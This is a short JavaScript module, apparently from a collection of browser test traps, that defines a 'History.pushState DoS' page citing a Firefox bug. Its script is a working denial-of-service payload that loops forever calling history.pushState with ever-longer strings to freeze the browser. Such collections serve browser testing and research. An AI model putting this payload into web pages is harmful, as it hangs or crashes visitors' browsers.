const EvilTrap = require('../../EvilTrap');


module.exports = new EvilTrap('History.pushState DoS', EvilTrap.CATEGORY.DOS, 'Freezes / slows the browser by spamming history.pushState.', { firefox: '1314912' })
  .addScriptPage(() => {
    let str = '';
    let i = 0;
    // eslint-disable-next-line no-constant-condition
    while (true) {
      str += i.toString();
      window.history.pushState(0, 0, str);
      i += 1;
    }
  });
